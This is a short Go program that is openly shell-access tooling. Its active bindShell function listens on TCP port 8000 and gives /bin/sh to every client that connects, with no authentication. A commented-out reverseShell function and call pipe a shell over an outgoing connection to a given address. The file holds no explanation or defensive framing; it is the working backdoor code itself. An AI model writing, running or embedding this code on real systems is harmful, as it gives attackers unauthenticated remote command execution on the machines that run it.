package main

import (
	"log"
	"net"
	"os/exec"
)

/*
func reverseShell(network, address, shell string) {
	c, _ := net.Dial(network, address)
	cmd := exec.Command(shell)
	cmd.Stdin = c
	cmd.Stdout = c
	cmd.Stderr = c
	cmd.Run()
}
*/

func bindShell(network, address, shell string) {
	l, err := net.Listen(network, address)
	if err != nil {
		log.Fatalln(err)
	}
	defer l.Close()
	for {
		// Wait for a connection.
		conn, _ := l.Accept()
		// Handle the connection in a new goroutine.
		// The loop then returns to accepting, so that
		// multiple connections may be served concurrently.
		go func(c net.Conn) {
			cmd := exec.Command(shell)
			cmd.Stdin = c
			cmd.Stdout = c
			cmd.Stderr = c
			cmd.Run()
			defer c.Close()
		}(conn)
	}
}

func main() {
	//reverseShell("tcp", ":8000", "/bin/sh")
	bindShell("tcp", ":8000", "/bin/sh")
}
